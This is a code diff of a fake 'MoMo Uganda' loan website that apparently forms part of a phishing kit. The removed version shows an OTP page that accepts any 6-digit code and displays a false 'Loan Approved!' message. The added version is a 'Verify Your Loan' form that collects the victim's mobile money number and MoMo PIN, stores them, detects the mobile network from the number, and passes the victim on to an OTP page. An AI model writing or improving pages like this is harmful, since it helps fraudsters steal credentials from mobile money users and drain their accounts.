@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>OTP Verification - MoMo Uganda</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>Verify Loan - MoMo Uganda</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-family: 'DM Sans', sans-serif;
             background: #f3f4f6;
             min-height: 100vh;
             display: flex;
@@ -16,228 +16,223 @@
             justify-content: center;
             padding: 16px;
         }
-        .container {
+        .card {
             width: 100%;
-            max-width: 420px;
+            max-width: 430px;
             background: white;
-            border-radius: 24px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            border-radius: 28px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
             overflow: hidden;
         }
-        .logo-section {
+        .header {
             background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
-            text-align: center;
-            padding: 28px 0 22px;
+            padding: 28px 28px 24px;
         }
-        .brand-logo {
-            display: inline-flex;
+        .logo-wrap {
+            display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
+            margin-bottom: 18px;
         }
-        .logo-icon {
-            width: 48px;
-            height: 48px;
+        .logo-bg {
             background: white;
             border-radius: 14px;
+            padding: 6px;
+            width: 48px;
+            height: 48px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
         .brand-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
             color: white;
-            font-size: 26px;
-            font-weight: 700;
         }
-        .tagline {
-            color: rgba(255,255,255,0.85);
-            font-size: 12.5px;
+        .brand-sub {
+            font-size: 11.5px;
+            color: rgba(255,255,255,0.72);
         }
-        h1 {
-            text-align: center;
-            font-size: 22px;
-            font-weight: 700;
-            color: #1e2937;
-            margin: 22px 0 6px;
-        }
-        .subtitle {
-            text-align: center;
-            color: #475569;
-            font-size: 14px;
-            padding: 0 25px 18px;
-        }
-        .offer-info {
-            background: #fff0f0;
-            margin: 0 20px 18px;
-            padding: 15px;
-            border-radius: 16px;
-            text-align: center;
-        }
-        .offer-amount {
-            color: #E42320;
+        .header-title {
+            font-family: 'Sora', sans-serif;
+            font-size: 23px;
             font-weight: 800;
-            font-size: 24px;
-        }
-        .otp-container {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 18px 0 26px;
-            padding: 0 20px;
-            flex-wrap: wrap;
-        }
-        .otp-input {
-            width: 52px;
-            height: 62px;
-            text-align: center;
-            font-size: 26px;
-            font-weight: 700;
-            color: #E42320;
-            border: 2px solid #e2e8f0;
-            border-radius: 14px;
-            outline: none;
-            background: white;
-        }
-        .otp-input:focus {
-            border-color: #E42320;
-            box-shadow: 0 0 0 4px rgba(228,35,32,0.15);
-        }
-        .btn-action {
-            width: 100%;
-            background: #E42320;
             color: white;
-            border: none;
-            padding: 17px;
-            font-size: 17px;
-            font-weight: 700;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 10px 0;
         }
-        .back-btn {
-            width: 100%;
-            background: transparent;
-            color: #64748b;
-            border: 2px solid #e2e8f0;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
+        .header-desc {
+            font-size: 13.5px;
+            color: rgba(255,255,255,0.78);
+            margin-top: 6px;
         }
-        .check-icon {
-            width: 60px;
-            height: 60px;
-            background: #10b981;
-            border-radius: 50%;
+        .loan-info {
+            margin: 20px 22px 0;
+            background: rgba(228,35,32,0.08);
+            border: 1px solid rgba(228,35,32,0.18);
+            border-radius: 18px;
+            padding: 16px 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .loan-icon {
+            width: 42px; height: 42px;
+            background: #E42320;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 16px;
             color: white;
-            font-size: 30px;
+            font-size: 20px;
+        }
+        .loan-amount {
+            font-family: 'Sora', sans-serif;
+            font-size: 26px;
+            font-weight: 800;
+            color: #111827;
+        }
+        .form-body {
+            padding: 22px 22px 26px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 7px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            background: #f9fafb;
+            border: 1.5px solid #e5e7eb;
+            border-radius: 13px;
+            font-size: 15.5px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #E42320;
+        }
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #E42320, #c01c1a);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-back {
+            width: 100%;
+            background: transparent;
+            color: #4b5563;
+            border: 1.5px solid #e5e7eb;
+            padding: 14px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .security-note {
+            text-align: center;
+            font-size: 12px;
+            color: #9ca3af;
+            margin-top: 18px;
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="logo-section">
-        <div class="brand-logo">
-            <div class="logo-icon">
+<div class="card">
+    <div class="header">
+        <div class="logo-wrap">
+            <div class="logo-bg">
                 <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
-                    <rect x="3" y="12" width="22" height="14" rx="3" fill="#E42320"/>
+                    <rect x="3" y="12" width="22" height="14" rx="3" fill="white"/>
                     <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="white" stroke-width="2.2" fill="none"/>
-                    <circle cx="14" cy="19" r="2.5" fill="white"/>
+                    <circle cx="14" cy="19" r="2.5" fill="#E42320"/>
                 </svg>
             </div>
             <div>
                 <div class="brand-name">MoMo Uganda</div>
-                <div class="tagline">Mobile Money • Loans</div>
+                <div class="brand-sub">Mobile Money</div>
             </div>
         </div>
+        <div class="header-title">Verify Your Loan</div>
+        <div class="header-desc">Enter your MoMo number and PIN</div>
     </div>
 
-    <div class="content-wrapper">
-        <h1>Enter OTP Code</h1>
-        <p class="subtitle">Enter any 6-digit code to complete your loan</p>
-
-        <div class="offer-info">
-            <div class="offer-amount" id="offerAmount">—</div>
-            <div id="offerDetails" style="font-size:12px; color:#64748b; margin-top:5px;"></div>
-        </div>
-
-        <div class="otp-container" id="otpInputs"></div>
-
-        <div style="padding: 0 25px 30px;">
-            <button class="btn-action" id="verifyBtn">Verify & Complete Loan</button>
-            <button class="back-btn" onclick="window.location.href='verify.html'">← Back</button>
+    <div class="loan-info">
+        <div class="loan-icon">₸</div>
+        <div>
+            <div style="font-size:11px; color:#E42320;">Loan Amount</div>
+            <div class="loan-amount" id="loanAmount">—</div>
+            <div id="loanDetails" style="font-size:12px; color:#4b5563;"></div>
         </div>
     </div>
-</div>
 
-<div id="completionModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:20000; align-items:center; justify-content:center; padding:20px;">
-    <div style="background:white; max-width:380px; border-radius:24px; padding:32px 24px; text-align:center;">
-        <div class="check-icon">✓</div>
-        <h2 style="color:#1e2937; margin-bottom:8px;">Loan Approved!</h2>
-        <p style="color:#64748b; margin-bottom:24px;">Your loan has been successfully approved. Funds will be sent to your MoMo account shortly.</p>
-        <button onclick="window.location.href='index.html'" style="background:#E42320; color:white; border:none; padding:14px 28px; border-radius:50px; font-weight:700; cursor:pointer;">Return Home</button>
+    <div class="form-body">
+        <div class="form-group">
+            <label>Mobile Money Number</label>
+            <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
+        </div>
+        <div class="form-group">
+            <label>MoMo PIN</label>
+            <input type="password" id="pin" placeholder="••••" maxlength="4">
+        </div>
+        <button class="btn-primary" id="submitBtn">Continue →</button>
+        <button class="btn-back" onclick="window.location.href='index.html'">← Back</button>
+        <div class="security-note">🔒 Secured by MoMo Uganda</div>
     </div>
 </div>
 
 <script>
     function loadLoanData() {
-        const calculatorData = sessionStorage.getItem('calculatorData');
-        if (calculatorData) {
-            const data = JSON.parse(calculatorData);
-            document.getElementById('offerAmount').textContent = `UGX ${data.amount.toLocaleString()}`;
-            const months = data.duration / 30;
-            document.getElementById('offerDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: UGX ${data.monthly.toLocaleString()}`;
+        const data = sessionStorage.getItem('calculatorData');
+        if (data) {
+            const loan = JSON.parse(data);
+            document.getElementById('loanAmount').textContent = `UGX ${loan.amount.toLocaleString()}`;
+            document.getElementById('loanDetails').textContent = `${loan.duration/30} months • UGX ${loan.monthly.toLocaleString()}/month`;
         }
     }
 
-    function createInputs() {
-        const container = document.getElementById('otpInputs');
-        container.innerHTML = '';
-        for (let i = 0; i < 6; i++) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.maxLength = 1;
-            input.className = 'otp-input';
-            input.inputMode = 'numeric';
-            container.appendChild(input);
-        }
-    }
-
-    function getCode() {
-        return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value.trim()).join('');
-    }
-
-    function setupAutoFocus() {
-        const inputs = document.querySelectorAll('.otp-input');
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', () => {
-                input.value = input.value.replace(/\D/g, '');
-                if (input.value.length === 1 && index < 5) {
-                    inputs[index + 1].focus();
-                }
-            });
-        });
-    }
-
-    document.getElementById('verifyBtn').onclick = () => {
-        const otp = getCode();
-        if (otp.length !== 6) {
-            alert("Enter 6-digit code");
+    document.getElementById('submitBtn').onclick = () => {
+        const phone = document.getElementById('phone').value.trim();
+        const pin = document.getElementById('pin').value.trim();
+        
+        if (!phone || phone.length !== 10) {
+            alert("Enter valid Uganda number (10 digits)");
             return;
         }
-        // Any 6-digit code works - show success
-        document.getElementById('completionModal').style.display = 'flex';
-        sessionStorage.clear();
+        if (!pin || pin.length !== 4) {
+            alert("PIN must be 4 digits");
+            return;
+        }
+
+        sessionStorage.setItem('userPhone', phone);
+        sessionStorage.setItem('userPin', pin);
+        
+        let network = 'MTN';
+        if (phone.startsWith('075') || phone.startsWith('074')) network = 'Airtel';
+        else if (phone.startsWith('070') || phone.startsWith('076')) network = 'Africell';
+        sessionStorage.setItem('userNetwork', network);
+        
+        window.location.href = 'otp.html';
     };
 
-    createInputs();
-    setupAutoFocus();
+    document.getElementById('phone').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+    });
+
+    document.getElementById('pin').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
+    });
+
     loadLoanData();
-    document.querySelectorAll('.otp-input')[0]?.focus();
 </script>
 </body>
 </html>
